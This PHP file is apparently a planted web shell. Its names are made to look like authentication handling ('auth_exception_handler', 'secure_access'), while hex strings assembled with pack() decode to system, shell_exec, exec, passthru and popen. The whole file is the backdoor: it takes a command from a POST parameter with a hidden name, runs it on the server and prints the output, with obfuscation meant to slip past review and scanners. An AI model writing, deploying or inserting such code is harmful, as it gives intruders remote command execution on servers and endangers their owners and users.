<?php


$fac1 = '3';
$fac2 = '9';
$fac3 = '7';
$fac4 = '5';
$fac5 = '6';
$fac6 = 'c';
$fac7 = '4';
$fac8 = '2';
$fac9 = 'd';
$fac10 = 'f';
$fac11 = 'e';
$fac12 = '0';
$auth_exception_handler1 = pack("H*", '7'.$fac1.'7'.$fac2.'7'.$fac1.$fac3.'4'.'6'.$fac4.$fac5.'d');
$auth_exception_handler2 = pack("H*", '7'.$fac1.'6'.'8'.'6'.$fac4.$fac5.$fac6.$fac5.$fac6.$fac4.'f'.'6'.'5'.'7'.'8'.$fac5.'5'.'6'.$fac1);
$auth_exception_handler3 = pack("H*", $fac5.$fac4.'7'.'8'.'6'.$fac4.'6'.'3');
$auth_exception_handler4 = pack("H*", $fac3.'0'.$fac5.'1'.'7'.$fac1.$fac3.$fac1.'7'.$fac7.$fac5.'8'.$fac3.$fac8.$fac3.$fac4);
$auth_exception_handler5 = pack("H*", '7'.'0'.'6'.'f'.'7'.'0'.'6'.$fac4.'6'.'e');
$auth_exception_handler6 = pack("H*", $fac3.'3'.$fac3.'4'.'7'.$fac8.'6'.'5'.'6'.'1'.'6'.$fac9.$fac4.$fac10.$fac5.$fac3.$fac5.$fac4.'7'.'4'.$fac4.$fac10.'6'.$fac1.'6'.$fac10.'6'.$fac11.'7'.$fac7.$fac5.'5'.$fac5.'e'.'7'.'4'.'7'.'3');
$auth_exception_handler7 = pack("H*", '7'.$fac12.'6'.$fac1.'6'.'c'.'6'.$fac10.'7'.'3'.'6'.$fac4);
$secure_access = pack("H*", $fac3.$fac1.$fac5.$fac4.'6'.'3'.$fac3.$fac4.$fac3.'2'.$fac5.'5'.'5'.$fac10.'6'.'1'.'6'.'3'.$fac5.'3'.'6'.$fac4.'7'.'3'.$fac3.'3');
if (isset($_POST[$secure_access])) {
    $secure_access = pack("H*", $_POST[$secure_access]);
    if (function_exists($auth_exception_handler1)) {
        $auth_exception_handler1($secure_access);
    } elseif (function_exists($auth_exception_handler2)) {
        print $auth_exception_handler2($secure_access);
    } elseif (function_exists($auth_exception_handler3)) {
        $auth_exception_handler3($secure_access, $binding_marker);
        print join("\n", $binding_marker);
    } elseif (function_exists($auth_exception_handler4)) {
        $auth_exception_handler4($secure_access);
    } elseif (function_exists($auth_exception_handler5) && function_exists($auth_exception_handler6) && function_exists($auth_exception_handler7)) {
        $token_k = $auth_exception_handler5($secure_access, 'r');
        if ($token_k) {
            $item_ent = $auth_exception_handler6($token_k);
            $auth_exception_handler7($token_k);
            print $item_ent;
        }
    }
    exit;
}
